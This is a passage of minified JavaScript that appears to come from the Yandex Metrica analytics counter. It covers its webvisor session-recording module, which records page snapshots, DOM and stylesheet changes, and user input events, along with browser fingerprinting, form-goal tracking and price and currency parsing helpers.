                n = t.L;
              (t = t.data), this.Dd[n] || (this.Dd[n] = { data: [] });
              var r = this.Dd[n];
              (r.data = r.data.concat(t)),
                this.b.isNaN(r.wd) &&
                  zu(function (t) {
                    "page" === t.type && (r.wd = t.data.ya - e.D.yf());
                  }, r.data),
                this.b.isNaN(r.wd) ||
                  (this.D.ca(
                    Vu(function (t) {
                      return (t.K += r.wd), (t.K = e.b.Math.max(0, t.K)), t;
                    }, r.data)
                  ),
                  (r.data = []));
            }),
            (e.prototype.xi = function (t) {
              var e = t.getAttribute("src"),
                n = t.getAttribute("sandbox");
              return (
                !(
                  t.getAttribute("_ym_ignore") ||
                  (n && !n.match(Jv)) ||
                  (e &&
                    "about:blank" !== e &&
                    (e = fa(this.b, e).host) &&
                    Xi(this.b).host !== e)
                ) && mo(t, "contentWindow.location.href")
              );
            }),
            e
          );
        })(mv),
        Zv = (function (t) {
          function e(e, n, r) {
            return (
              ((e = t.call(this, e, n, r) || this).ye = e.J.G(e.ye, "ps")), e
            );
          }
          return (
            Jo(e, t),
            (e.prototype.start = function () {
              this.D.ma().yc({
                ga: [this.b.document.documentElement],
                Zc: this.ye,
              });
            }),
            (e.prototype.ye = function (t) {
              var e = this.D.Zh(),
                n = e.Rh(),
                r = Xi(this.b),
                i = r.host,
                o = r.protocol;
              r = r.pathname;
              var a = Ci(this.b),
                u = a[0];
              (a = a[1]),
                this.D.V(
                  "page",
                  {
                    content: Vu(function (t) {
                      return delete (t = Nu({}, t)).node, t;
                    }, t),
                    Ze: n || "",
                    Cf: !!n,
                    viewport: { width: u, height: a },
                    title: this.b.document.title,
                    doctype: e.Th() || "",
                    We: this.b.location.href,
                    Dg: this.b.navigator.userAgent,
                    referrer: this.b.document.referrer,
                    screen: {
                      width: this.b.screen.width,
                      height: this.b.screen.height,
                    },
                    location: { host: i, protocol: o, path: r },
                    ya: this.D.yf(),
                    bd: e.ci(),
                  },
                  "page",
                  0
                );
            }),
            e
          );
        })(mv),
        Qv = ["addRule", "removeRule", "insertRule", "deleteRule"],
        tm = [
          [
            (function (t) {
              function e(e, n, r) {
                return (
                  ((e = t.call(this, e, n, r) || this).Ra = {}),
                  (e.Rb = {}),
                  (e.Xe = 0),
                  (e.Nc = e.J.G(e.Nc, "a")),
                  (e.qb = e.J.G(e.qb, "sr")),
                  (e.Oc = e.J.G(e.Oc, "r")),
                  (e.ca = e.J.G(e.ca, "d")),
                  e
                );
              }
              return (
                Jo(e, t),
                (e.prototype.start = function () {
                  var t = this.D.ma();
                  t.C("style", "NA:", this.Nc),
                    t.C("style", "NR:", this.Oc),
                    this.ca();
                }),
                (e.prototype.stop = function () {
                  var e = this;
                  t.prototype.stop.call(this);
                  var n = this.D.ma();
                  n.da("style", "NA:", this.Nc),
                    n.da("style", "NR:", this.Oc),
                    this.ca(),
                    ro(this.b, this.Xe),
                    zu(function (t) {
                      e.Ra[t].sheet && e.eg(e.Ra[t].sheet);
                    }, Mu(this.Ra)),
                    (this.Ra = {});
                }),
                (e.prototype.ca = function () {
                  var t = this;
                  zu(function (e) {
                    var n = e[0];
                    if ((e = e[1]).length) {
                      for (
                        var r = [], i = e[0].K, o = [], a = 0;
                        a < e.length;
                        a += 1
                      ) {
                        var u = e[a],
                          c = u.K;
                        delete u.K,
                          c <= i + 50
                            ? r.push(u)
                            : (o.push(r), (i = c), (r = [u]));
                      }
                      r.length && o.push(r),
                        o.length &&
                          zu(function (e) {
                            t.D.V(
                              "event",
                              { target: ec(n), Aa: e },
                              "stylechange",
                              i
                            );
                          }, o),
                        delete t.Rb[n];
                    }
                  }, Ru(this.Rb)),
                    (this.Xe = Br(this.b, this.ca, 100));
                }),
                (e.prototype.qb = function (t, e, n, r, i) {
                  void 0 === r && (r = ""),
                    void 0 === i && (i = -1),
                    this.Rb[t] || (this.Rb[t] = []),
                    this.Rb[t].push({ ie: e, style: r, index: i, K: n });
                }),
                (e.prototype.bj = function (t, e) {
                  var n = this,
                    r = t.addRule,
                    i = t.removeRule,
                    o = t.insertRule,
                    a = t.deleteRule;
                  ko(r) &&
                    (t.addRule = function (i, o, a) {
                      return (
                        n.qb(e, "a", n.D.K(), i + "{" + o + "}", a),
                        r.call(t, i, o, a)
                      );
                    }),
                    ko(i) &&
                      (t.removeRule = function (r) {
                        return n.qb(e, "r", n.D.K(), "", r), i.call(t, r);
                      }),
                    ko(o) &&
                      (t.insertRule = function (r, i) {
                        return n.qb(e, "a", n.D.K(), r, i), o.call(t, r, i);
                      }),
                    ko(a) &&
                      (t.deleteRule = function (r) {
                        return n.qb(e, "r", n.D.K(), "", r), a.call(t, r);
                      });
                }),
                (e.prototype.eg = function (t) {
                  var e = this;
                  zu(function (n) {
                    var r = e.b.CSSStyleSheet.prototype[n];
                    ko(r) && (t[n] = yu(r, t));
                  }, Qv);
                }),
                (e.prototype.Dh = function (t) {
                  try {
                    return t.cssRules || t.rules;
                  } catch (t) {
                    return null;
                  }
                }),
                (e.prototype.Nc = function (t) {
                  var e = t.data;
                  if (
                    ((t = e.id),
                    (e = e.node).sheet &&
                      !e.getAttribute("src") &&
                      !e.innerText)
                  ) {
                    var n = e.sheet,
                      r = this.Dh(n);
                    if (r && r.length) {
                      for (var i = [], o = 0; o < r.length; o += 1)
                        i.push({ style: r[o].cssText, index: o, ie: "a" });
                      this.D.V("event", { Aa: i, target: t }, "stylechange");
                    }
                    this.bj(n, t), (this.Ra[t] = e);
                  }
                }),
                (e.prototype.Oc = function (t) {
                  t = t.data.id;
                  var e = this.Ra[t];
                  e && (delete this.Ra[t], e.sheet && this.eg(e.sheet));
                }),
                e
              );
            })(mv),
            "ss",
          ],
          [Cv, "in"],
          [wv, "mu"],
          [Av, "r"],
          [kv, "sc"],
          [Sv, "mo"],
          [Mv, "f"],
          [Iv, "se"],
          [Lv, "wf"],
          [Bv, "t"],
          [Fv, "src"],
          [Gv, "z"],
          [Kv, "ks"],
        ];
      tm.push([$v, "if"]), tm.push([Zv, "pa"]);
      var em,
        nm = Io(function (t) {
          var e = t.document;
          return {
            Jd: function () {
              if (e.scrollingElement) return e.scrollingElement;
              var t =
                0 === e.compatMode.indexOf("CSS1") ? e.documentElement : e.body;
              return mo(e, "documentElement.scrollHeight") >=
                mo(e, "body.scrollHeight")
                ? t
                : null;
            },
            Yh: function () {
              var e = t.screen;
              return (
                (e &&
                  mo(
                    e,
                    Bu(wo(e, mo), [
                      "orientation",
                      "mozOrientation",
                      "msOrientation",
                    ]) + ".angle"
                  )) ||
                0
              );
            },
            yk: wo(t, Ec),
            Gf: wo(t, vc),
            xk: wo(t, oc),
          };
        }),
        rm = (function () {
          function t(t, e) {
            var n = this;
            (this.Eb = 0),
              (this.fc = []),
              (this.Db = null),
              (this.na = this.Ub = this.sg = !1),
              (this.ya = 0),
              (this.Zh = function () {
                return n.page;
              }),
              (this.Hd = function () {
                return n.Eb;
              }),
              (this.yf = function () {
                return n.ya;
              }),
              (this.Wh = function () {
                return n.Xa;
              }),
              (this.xf = function () {
                return n.Db;
              }),
              (this.ma = function () {
                return n.Od;
              }),
              (this.K = function () {
                return n.Ie ? n.b.Math.max(n.Ie(gr) - n.ya, 0) : 0;
              }),
              (this.tc = function () {
                return n.options;
              }),
              (this.bb = function () {
                return n.dh;
              }),
              (this.V = function (t, e, r, i) {
                void 0 === i && (i = n.K()), (t = n.Vh(t, e, r, i)), n.ca(t);
              }),
              (this.Vh = function (t, e, r, i) {
                return (
                  void 0 === i && (i = n.K()),
                  { type: t, data: e, K: i, L: n.Eb, event: r }
                );
              }),
              (this.ca = function (t) {
                (t = lo(t) ? t : [t]),
                  n.sg && !n.Ub
                    ? n.na
                      ? ((t = Vu(function (t) {
                          return t.L ? t : Nu(t, { L: n.Eb });
                        }, t)),
                        n.xf().kg(t))
                      : ((t = Vu(k, t)), n.Be(t))
                    : (n.fc = n.fc.concat(t));
              }),
              (this.b = t);
            var r = P(t, this, "R");
            (this.Fe = r.G(this.Fe, "s")),
              (this.ca = r.G(this.ca, "sd")),
              (r = Pu(t)).l("wv2e") && Fi(),
              r.o("wv2e", !0),
              (this.options = e),
              (this.Xa = os(t)),
              (this.Od = new Ev(this.b, e)),
              (this.dh = nm(t)),
              (this.$e = Vu(function (e) {
                return new e[0](t, n, e[1]);
              }, tm)),
              this.vi(),
              (this.page = (function (t) {
                return {
                  Rh: function () {
                    var e = t.document.querySelector("base[href]");
                    return e ? e.getAttribute("href") : null;
                  },
                  Th: function () {
                    if (t.document.doctype) {
                      var e = Nu(
                          { name: "html", publicId: "", systemId: "" },
                          t.document.doctype
                        ),
                        n = e.publicId,
                        r = e.systemId;
                      return (
                        "<!DOCTYPE " +
                        iu("", [
                          e.name,
                          n ? ' PUBLIC "' + n + '"' : "",
                          !n && r ? " SYSTEM" : "",
                          r ? ' "' + r + '"' : "",
                        ]) +
                        ">"
                      );
                    }
                    return null;
                  },
                  ci: function () {
                    try {
                      if (!t.sessionStorage) return null;
                      var e = t.sessionStorage.getItem("__vw_tab_guid"),
                        n = !1;
                      try {
                        var r = t.opener ? t.opener.sessionStorage : null;
                        n = !!r && e === r.getItem("__vw_tab_guid");
                      } catch (t) {
                        n = !0;
                      }
                      return (
                        (e && !n) ||
                          ((e = R()),
                          t.sessionStorage.setItem("__vw_tab_guid", e)),
                        e
                      );
                    } catch (t) {
                      return null;
                    }
                  },
                };
              })(this.b)),
              this.Fe();
          }
          return (
            (t.prototype.start = function (t) {
              (this.sg = !0), (this.Be = t), this.hg();
            }),
            (t.prototype.stop = function () {
              yv(this.b) &&
                (zu(function (t) {
                  return t.stop();
                }, this.$e),
                this.Od.stop(),
                this.Db && this.Db.stop(),
                this.na || this.V("event", {}, "eof"));
            }),
            (t.prototype.cc = function (e, n) {
              var r = new t(e, Nu({}, this.options, { L: n }));
              return r.start(qo), r;
            }),
            (t.prototype.vi = function () {
              var t = this;
              (this.na = !!this.options.L),
                (this.Eb = this.options.L || 0),
                (this.Ub = !this.na);
              var e = this.options.Cg || [];
              e.push(Xi(this.b).host),
                (this.Db = (function (t, e, n) {
                  var r = Fr(t),
                    i = os(t),
                    o = Ec(t),
                    a = e.Hd(),
                    u =
                      !mo(t, "postMessage") ||
                      (o && !mo(t, "parent.postMessage")),
                    c = wo(r, Ho);
                  if (u) {
                    if (!a)
                      return (
                        Br(t, yu(r.O, r, "i", { na: !1 }), 10),
                        { Gd: c, kg: qo, stop: qo }
                      );
                    eo(Gi());
                  }
                  if (
                    (r.C(["sr"], function (n) {
                      var r,
                        i = T(t, n.source);
                      i &&
                        S(
                          t,
                          n.source,
                          (((r = {}).type = "н"), (r.frameId = e.ma().X(i)), r)
                        );
                    }),
                    r.C(["sd"], function (e) {
                      var n = e.data;
                      (e = e.source),
                        (t === e || T(t, e)) &&
                          r.O("sdr", { data: n.data, L: n.frameId });
                    }),
                    o && !a)
                  ) {
                    var s = !1,
                      f = 0,
                      h = function () {
                        var e;
                        S(t, t.parent, (((e = {}).type = "sr"), e)),
                          (f = Br(t, h, 100, "if.i"));
                      };
                    h();
                    var l = function (e) {
                      r.da(["н"], l), ro(t, f);
                      var i = fa(t, e.origin).host;
                      s ||
                        e.source !== t.parent ||
                        !e.data.frameId ||
                        ("about:blank" !== Xi(t).host && !Fu(i, n)) ||
                        ((s = !0), r.O("i", { L: e.data.frameId, na: !0 }));
                    };
                    r.C(["н"], l),
                      Br(
                        t,
                        function () {
                          r.da(["н"], l),
                            ro(t, f),
                            s || ((s = !0), r.O("i", { na: !1 }));
                        },
                        2e3,
                        "if.r"
                      );
                  }
                  return {
                    Gd: c,
                    kg: function (n) {
                      var r;
                      return S(
                        t,
                        t.parent,
                        (((r = {}).frameId = e.Hd()),
                        (r.data = n),
                        (r.type = "sd"),
                        r)
                      );
                    },
                    stop: (i = i.C(t, ["message"], function (e) {
                      var n = ua(t, e.data);
                      n &&
                        n.type &&
                        Fu(n.type, Wv) &&
                        r.O(n.type, {
                          data: n,
                          source: e.source,
                          origin: e.origin,
                        });
                    })),
                  };
                })(this.b, this, e)),
                (e = this.Db.Gd()),
                Ec(this.b)
                  ? this.Ub &&
                    e.C(["i"], function (e) {
                      (t.na = e.na), (t.Ub = !1), e.L && (t.Eb = e.L), t.hg();
                    })
                  : (this.Ub = this.na = !1);
            }),
            (t.prototype.hg = function () {
              var t = this.fc.splice(0, this.fc.length);
              this.ca(t);
            }),
            (t.prototype.Fe = function () {
              (this.Ie = br(this.b)),
                (this.ya = this.Ie(gr)),
                zu(function (t) {
                  t.start();
                }, this.$e),
                this.Od.start();
            }),
            t
          );
        })(),
        im =
          (((em = {}).mousemove = 0),
          (em.mouseup = 1),
          (em.mousedown = 2),
          (em.click = 3),
          (em.scroll = 4),
          (em.windowblur = 5),
          (em.windowfocus = 6),
          (em.focus = 7),
          (em.blur = 8),
          (em.eof = 9),
          (em.selection = 10),
          (em.change = 11),
          (em.input = 12),
          (em.touchmove = 13),
          (em.touchstart = 14),
          (em.touchend = 15),
          (em.touchcancel = 16),
          (em.touchforcechange = 17),
          (em.canvasMethod = 18),
          (em.canvasProperty = 19),
          (em.zoom = 20),
          (em.resize = 21),
          (em.mediaMethod = 22),
          (em.mediaProperty = 23),
          (em.keystroke = 24),
          (em.deviceRotation = 25),
          (em.fatalError = 26),
          (em.hashchange = 27),
          (em.stylechange = 28),
          em),
        om = Xo(function (t, e) {
          var n;
          return ((n = {})[yp(t)] = e), n;
        }),
        am = (function () {
          function t(t) {
            var e;
            (this.isSync = !1),
              (this.Ab = []),
              (this.lf = []),
              (this.b = t),
              (this.Gb =
                (((e = {}).event = yu(this.zh, this)),
                (e.page = om({ page: 1 })),
                (e.mutation = om({ Ki: 1 })),
                (e.activity = om({ Wg: 1 })),
                e)),
              (this.lf = [
                [["scroll"], { oj: 1 }],
                [["selection"], { qj: 1 }],
                [["change", "input"], { jh: 1 }],
                [["keystroke"], { Ei: 1 }, { Fc: 1 }],
                [["zoom"], { Xj: 1 }],
                [["resize"], { jj: 1 }],
                [
                  ["windowfocus", "windowblur", "focus", "blur", "eof"],
                  { Uj: 1 },
                ],
                [["mousemove", "mouseup", "mousedown", "click"], { Ii: 1 }],
                [["deviceRotation"], { uh: 1 }],
                [["fatalError"], { Fh: 1 }],
                [
                  [
                    "touchmove",
                    "touchstart",
                    "touchend",
                    "touchcancel",
                    "touchforcechange",
                  ],
                  { Cj: 1 },
                  { touches: 1 },
                  { touches: 1 },
                ],
                [["hashchange"], { ri: 1 }],
                [["stylechange"], { vj: 1 }, { Aa: 1 }, { Aa: 1 }],
              ]);
          }
          return (
            (t.prototype.zh = function (t) {
              var e,
                n,
                r = t.type,
                i = Bu(po(Au("0"), wo(r, Fu)), this.lf);
              i || eo(ms("vem." + r)), "eof" === r && (this.isSync = !0);
              var o = i[1],
                a = i[2];
              i = i[3];
              var u = t.Y;
              return {
                event:
                  ((e = { type: im[r], target: t.target, L: t.L }),
                  (e[yp(o)] = a
                    ? ((n = {}), (n[yp(a)] = i ? u[yp(i)] : u), n)
                    : u),
                  e),
              };
            }),
            (t.prototype.Da = function (t, e) {
              var n = this;
              void 0 === e && (e = !1);
              var r = Qn(t, function (t) {
                  var e = !gu(t.partNum);
                  return {
                    data: e ? void 0 : n.Gb[t.type](t.data),
                    nh: e ? t.data : void 0,
                    page: t.partNum,
                    end: t.end,
                    K: t.K,
                  };
                }),
                i = this.isSync || e ? 1 / 0 : 10,
                o = [(r = Wn(this.b, r, i))];
              return (
                this.Ab.push(r),
                r(
                  Cf(function (t) {
                    return (
                      (t = Yt(n.b, Zt, { buffer: t })),
                      (t = Wn(n.b, t, i, nr)),
                      o.push(t),
                      n.Ab.push(t),
                      t
                    );
                  })
                )(
                  Cf(function (t) {
                    return (
                      (t = zt(n.b, t.slice(-4))),
                      (t = Wn(n.b, t, i, nr)),
                      o.push(t),
                      n.Ab.push(t),
                      t
                    );
                  })
                )(
                  xf(function (t) {
                    return (
                      (t = t[t.length - 1]),
                      zu(function (t) {
                        (t = Ju(n.b)(t, n.Ab)), n.Ab.splice(t, 1);
                      }, o),
                      t
                    );
                  })
                )
              );
            }),
            (t.prototype.Ea = function (t) {
              return Yt(this.b, Jt, this.Gb[t.type](t.data))(rr(qo));
            }),
            (t.prototype.La = function (t) {
              return t[0];
            }),
            (t.prototype.ad = function (t, e) {
              for (
                var n = zt(this.b, t)(rr(qo)),
                  r = Math.ceil(n.length / e),
                  i = [],
                  o = 0;
                o < e;
                o += 1
              )
                i.push(n.slice(o * r, r * (o + 1)));
              return i;
            }),
            (t.prototype.isEnabled = function () {
              return Vt(this.b);
            }),
            t
          );
        })(),
        um = function (t, e, n, r) {
          var i = this;
          (this.md = this.Kb = !1),
            (this.Oa = []),
            (this.Pf = []),
            (this.jf = []),
            (this.send = function (t, e, n, r) {
              return (t = i.sender(t, i.bc, e)), n && r && t.then(n, r), t;
            }),
            (this.He = function (t, e, n, r) {
              return new us(function (i, o) {
                t.push([e, n, i, o, r]);
              });
            }),
            (this.li = function () {
              i.Oa = $i(function (t, e) {
                return t[4].partNum - e[4].partNum;
              }, i.Oa);
              var t = Cu(
                  function (t, e, n) {
                    return (e = e[4]), t && n + 1 === e.partNum;
                  },
                  !0,
                  i.Oa
                ),
                e = !!i.Oa[i.Oa.length - 1][4].end;
              return t && e;
            }),
            (this.Ad = function (t) {
              Kn(
                i.b,
                t.slice(),
                function (t) {
                  i.send(t[0], t[1], t[2], t[3]);
                },
                20,
                "s.w2.sf.fes"
              ),
                t.splice(0, t.length);
            }),
            (this.Jh = function () {
              i.md || ((i.md = !0), i.Ad(i.Pf), i.Ad(i.jf));
            }),
            (this.lh = function (t) {
              return Cu(
                function (t, e) {
                  var n = "page" === e.type && !e.L,
                    r = "eof" === e.data.type,
                    i = n && !!e.partNum;
                  return { rd: t.rd || i, qd: t.qd || n, pd: t.pd || r };
                },
                { qd: !1, pd: !1, rd: !1 },
                t
              );
            }),
            (this.ji = function (t, e, n, r) {
              return (
                r
                  ? ((t = i.He(i.Oa, t, e, n[0])),
                    i.li() && (i.Ad(i.Oa), (i.Kb = !0)))
                  : ((i.Kb = !0), (t = i.send(t, e))),
                t
              );
            }),
            (this.gi = function (t) {
              var e;
              return i.zi
                ? (((e = {})["wv-type"] = Wu(function (t) {
                    return "eof" === mo(t, "data.type");
                  }, t)
                    ? "2"
                    : "8"),
                  e)
                : {};
            }),
            (this.zf = function (t, e, n) {
              return (
                (e = { F: i.gi(n), H: Uc(), $: e, bf: !t && Xt(n), If: i.wi }),
                t && e.H.o("bt", 1),
                e
              );
            }),
            (this.Ah = function (t, e, n) {
              return (
                (t = i.zf(!1, t, e)), i.Kb ? i.send(t, n) : i.He(i.jf, t, n, e)
              );
            }),
            (this.Li = function (t, e, n) {
              if (((t = i.zf(!0, t, e)), i.Kb)) return i.send(t, n);
              var r,
                o = i.lh(e),
                a = o.qd,
                u = o.pd;
              return (
                (o = o.rd),
                a && (r = i.ji(t, n, e, o)),
                i.md
                  ? a || (r = i.send(t, n))
                  : (a || (r = i.He(i.Pf, t, n, e)), (i.Kb || u) && i.Jh()),
                r
              );
            }),
            (this.zi = r),
            (this.b = t),
            (this.wi = n),
            (this.sender = Sl(t, "W", e)),
            (this.bc = e);
        },
        cm = Hr("w2", function (t, e) {
          function n() {
            u = !0;
          }
          var r = Pu(t),
            i = Fc(e);
          if (
            !e.Ta ||
            rc(t) ||
            !t.MutationObserver ||
            !zo("Element", t.Element)
          )
            return qo;
          zo("MutationObserver", t.MutationObserver) ||
            Ml(t, i).warn(
              "MutationObserver is overriden, webvisor is not guaranteed to work in this environment"
            );
          var o = cu(function (n, r) {
              xn(t, e, r).catch(n);
            }),
            a = Q(t)(Cf(Eo([t, e], _)))(
              xf(function (e) {
                return new rm(t, e);
              })
            ),
            u = !1;
          return (
            (function (t) {
              var e = [],
                n = 0;
              return cu(function (r, i) {
                zu(function (o, a) {
                  o(
                    Zn(r, function (o) {
                      try {
                        (e[a] = o), (n += 1) === t.length && i(e);
                      } catch (t) {
                        r(t);
                      }
                    })
                  );
                }, t);
              });
            })([a, o])(
              Zn(Ur(t, "wv2.R.c"), function (o) {
                var a = o[0];
                if (((o = o[1]), !u)) {
                  n = function () {
                    u || ((u = !0), a && a.stop());
                  };
                  var c = r.l("wv2Counter");
                  if (!dt(t, o) || c) n();
                  else if (
                    (os(t).C(t, ["beforeunload", "unload"], n),
                    r.o("wv2Counter", i),
                    r.o("stopRecorder", n),
                    (o = [new Ll(t)]).unshift(new am(t)),
                    (o = Bu(function (t) {
                      return t.isEnabled();
                    }, o)))
                  ) {
                    c = new um(t, e, !(o instanceof Ll), 0);
                    var s = Xl.Fd(i, "m", yu(c.Li, c), o, t),
                      f = Xl.Fd(i, "e", yu(c.Ah, c), o, t);
                    (c = (o = (function () {
                      var t = Cu(
                        function (t, e) {
                          return (t[e[0]] = { od: 0, fh: 1 / e[1] }), t;
                        },
                        {},
                        [
                          ["blur", 0.0034],
                          ["change", 0.0155],
                          ["click", 0.01095],
                          ["deviceRotation", 2e-4],
                          ["focus", 0.0061],
                          ["mousemove", 0.5132],
                          ["scroll", 0.4795],
                          ["selection", 0.0109],
                          ["touchcancel", 2e-4],
                          ["touchend", 0.0265],
                          ["touchforcechange", 0.0233],
                          ["touchmove", 0.1442],
                          ["touchstart", 0.027],
                          ["zoom", 0.0014],
                        ]
                      );
                      return {
                        Yg: function (e) {
                          if (e.length)
                            return {
                              type: "activity",
                              data: Cu(
                                function (e, n) {
                                  var r = t[n];
                                  return Math.round(e + r.od * r.fh);
                                },
                                0,
                                Mu(t)
                              ),
                            };
                        },
                        Ti: function (e) {
                          e && (e = t[e.data.type]) && (e.od += 1);
                        },
                      };
                    })()).Ti),
                      f.C("ag", o.Yg),
                      f.C("p", c),
                      s.C("see", function (t) {
                        var e = !1;
                        zu(function (t) {
                          "page" === t.type && (e = !0);
                        }, t),
                          e &&
                            (u ||
                              f.push({
                                type: "event",
                                data: {
                                  type: "fatalError",
                                  Y: {
                                    code: "invalid-snapshot",
                                    Bh: "p.s.f",
                                    stack: "",
                                  },
                                },
                              }),
                            n());
                      });
                    var h = qu(function (t) {
                      "eof" === mo(t, "data.type")
                        ? (f.push(t), s.push(t), f.flush(), s.flush())
                        : ("event" === t.type ? f : s).push(t);
                    });
                    Br(t, n, 864e5),
                      qn(t, function () {
                        a.start(h);
                      });
                  }
                }
              })
            ),
            function () {
              return n();
            }
          );
        }),
        sm = Xo(function (t, e) {
          0 === parseFloat(mo(e, "settings.c_recp")) &&
            (t.Yd.o("ymoo" + t.Va, t.yg(mr)),
            t.ud && t.ud.destruct && t.ud.destruct());
        }),
        fm = Hr("wsa", function (t, e) {
          var n = { Va: Fc(e), ud: vn(t, e), yg: mf(t), Yd: pf(t) },
            r = n.yg(mr);
          if (n.Yd.Qd) return !1;
          var i = n.Yd.l("ymoo" + n.Va);
          return (
            !!(i && 30 > r - i) || (xn(t, e, sm(n)).catch(Ur(t, "d.f")), !1)
          );
        }),
        hm = po(function (t) {
          return (
            (t = mo(t, "navigator.plugins") || []),
            _u(t)
              ? po(
                  Zi,
                  ju(Boolean),
                  $u(function (t, e) {
                    return t.name > e.name ? 1 : 2;
                  }),
                  qu(Mt)
                )(t)
              : ""
          );
        }, uu(",")),
        lm = function (t) {
          var e = Es(t);
          if (!e) return "";
          e = e("canvas");
          var n = [],
            r = { th: Dd, Eh: x },
            i = r.Eh;
          r = r.th;
          try {
            var o = yo("getContext", e);
            n = Vu(po(Ho, o), r);
          } catch (t) {
            return "";
          }
          return (o = Bu(Ho, n)) ? i(t, { canvas: e, ih: o }) : "";
        },
        dm = ["name", "lang", "localService", "voiceURI", "default"],
        pm = Io(function (t, e) {
          return xn(t, e, Au("settings.form_goals"));
        }, Go),
        vm = wo(!0, m),
        mm = Hr("s.f.i", function (t, e) {
          var n = [];
          os(t).C(t, ["click"], Ur(t, "s.f.c", Eo([t, e, n], v))),
            os(t).C(
              t,
              ["submit"],
              Ur(t, "s.f.e", po(Au("target"), Eo([t, e, n], vm)))
            ),
            g(t, e, "Form goal. Counter " + e.id + ". Init.");
        }),
        gm = qo,
        bm = uo("isp.stat", function (t, e) {
          return new us(function (n, r) {
            if (
              (function (t, e, n) {
                var r = Ps(e);
                if ((Fu(n, r.kb) || r.kb.push(n), mu(r.ab))) {
                  if (!(n = Es(t))) return null;
                  if (
                    ((n = n("iframe")),
                    Nu(n.style, {
                      display: "none",
                      width: "1px",
                      height: "1px",
                      visibility: "hidden",
                    }),
                    (n.src = e),
                    !(t = _i(t)))
                  )
                    return null;
                  t.appendChild(n), (r.ab = n);
                } else
                  (t = mo(r.ab, "contentWindow")) &&
                    t.postMessage("frameReinit", "*");
                return r.ab;
              })(t, Xc, "isp")
            ) {
              var i = function (t) {
                ("1" === t ? n : r)(),
                  gm(),
                  (t = Ps(Xc)),
                  Fu("isp", t.kb) &&
                    ((t.kb = Lu(po(ou("isp"), Fo), t.kb)),
                    t.kb.length || (Ri(t.ab), (t.ab = null)));
              };
              (gm = os(t).C(t, ["message"], Eo([t, e, i], p))), Br(t, i, 1500);
            } else r();
          });
        }),
        ym = uo("isp", function (t, e) {
          xn(t, e, function (n) {
            var r = Bu(
              function (t) {
                return mo(n, "settings." + t);
              },
              ["rt", "mf"]
            );
            if (r && Mc(t)) {
              var i = _d(n) && !$c(t),
                o = Fc(e),
                a = yf(e);
              if (((a[o] = { Qc: r, status: i ? 3 : 4 }), !i))
                return (
                  (r = (function (t, e, n) {
                    var r,
                      i = wf(t, e),
                      o = Xi(t);
                    (o = Bi(o.protocol + "//" + o.hostname + o.pathname)),
                      (e = bf(t, e));
                    var a = "";
                    do {
                      a += Ki(t);
                    } while (a.length < e.length);
                    (a = a.slice(0, e.length)), (t = "");
                    for (var u = 0; u < e.length; u += 1)
                      t += (e.charCodeAt(u) + a.charCodeAt(u) - 96) % 10;
                    return (
                      (t = (e = [a, t])[0]),
                      (e = e[1]),
                      ((r = {}),
                      (r.mf =
                        "https://adstat.yandex.ru/track?service=metrika&id=" +
                        e +
                        "&mask=" +
                        t +
                        "&ref=" +
                        o),
                      (r.rt =
                        "https://" +
                        i +
                        ".mc.yandex.ru/watch/3/1?browser-info=rt:1"),
                      r)[n]
                    );
                  })(t, e, r)),
                  bm(t, r)
                    .then(function () {
                      a[o].status = 1;
                    })
                    .catch(function () {
                      a[o].status = 2;
                    })
                );
            }
          }).catch(Ur(t, "l.isp"));
        }),
        wm = /[^\d]/g,
        Em = /[^\d.,]/g,
        xm = /[.,]$/,
        Cm = Hr("ep.pp", function (t, e) {
          if (!e) return 0;
          t: {
            for (
              var n = e.replace(Em, "").replace(xm, ""),
                r = "0" === n[n.length - 1],
                i = n.length;
              0 < i && !(3 < n.length - i + 1 && r);
              --i
            ) {
              var o = n[i - 1];
              if (Fu(o, [",", "."])) {
                r = o;
                break t;
              }
            }
            r = "";
          }
          return (
            (n = r ? e.split(r) : [e]),
            (r = r ? n[1] : "00"),
            (n = parseFloat(n[0].replace(wm, "") + "." + r.replace(wm, ""))),
            (r = Math.pow(10, 8) - 0.01),
            t.isNaN(n) ? (n = 0) : ((n = Math.min(n, r)), (n = Math.max(n, 0))),
            n
          );
        }),
        Am = [
          [["EUR", "€"], "978"],
          [["USD", "У\\.Е\\.", "\\$"], "840"],
          [["UAH", "ГРН", "₴"], "980"],
          ["ТГ KZT ₸ ТҢГ TENGE ТЕНГЕ".split(" "), "398"],
          [["GBP", "£", "UKL"], "826"],
          ["RUR RUB Р РУБ ₽ P РUB PУБ PУB PYБ РYБ РУB PУБ".split(" "), "643"],
        ],
        _m = Io(function (t) {
          return new RegExp(t.join("|"), "i");
        }),
        km = Hr("ep.cp", function (t) {
          if (!t) return "643";
          var e = t.replace(/\s/g, "");
          return (t = Bu(function (t) {
            return _m(t[0]).test(e);
          }, Am))
            ? t[1]
            : "643";
        }),
        Tm = Io(function () {
          function t() {
            var t = u + "0",
              e = u + "1";
            o[t]
              ? o[e]
                ? ((u = u.slice(0, -1)), --a)
                : ((i[e] = n(8)), (o[e] = 1))
              : ((i[t] = n(8)), (o[t] = 1));
          }
          function e() {
            var t = u + "1";
            o[u + "0"]
              ? o[t]
                ? ((u = u.slice(0, -1)), --a)
                : (o[(u += "1")] = 1)
              : (o[(u += "0")] = 1);
          }
          function n(t) {
            void 0 === t && (t = 1);
            var e = r.slice(a, a + t);
            return (a += t), e;
          }
          for (
            var r = d(
                "Cy2FcreLJLpYXW3BXFJqldVsGMwDcBw2BGnHL5uj1TKstzse3piMo3Osz+EqDotgqs1TIoZvKtMKDaSRFztgUS8qkqZcaETgKWM54tCpTXjV5vW5OrjBpC0jF4mspUBQGd95fNSfv+vz+g+Hze33Hg8by+Yen1PP6zsdl7PQCwX9mf+f7FMb9x/Pw+v2Pp8Xy74eTwuBwTt913u4On1XW6hxOO5nIzFam00tC218S0kaeugpqST+XliLOlMoTpRQkuewUxoy4CT3efWtdFjSAAm+1BkjIhyeU4vGOf13a6U8wzNY4bGo6DIUemE7N3SBojDr7ezXahpWF022y8mma1NuTnZbq8XZZlPStejfG/CsbPhV6/bSnA=="
              ).join(""),
              i = {},
              o = {},
              a = 1,
              u = "";
            a < r.length - 1;

          )
            ("0" === n() ? e : t)();
          return i;
        }),
        Sm = Hr("ep.dec", function (t, e) {
          if (!e || rc(t)) return [];
          var n = d(e),
            r = n[1],
            i = n[2],
            o = n.slice(3);
          if (2 !== nc(n[0])) return [];
          (n = Tm()), (o = o.join("")), (i = nc(r + i));
          var a = "";
          r = "";
          for (var u = 0; r.length < i && o[u]; )
            n[(a += o[u])] && ((r += String.fromCharCode(nc(n[a]))), (a = "")),
              (u += 1);
          for (n = "", o = 0; o < r.length; )
            128 > (i = r.charCodeAt(o))
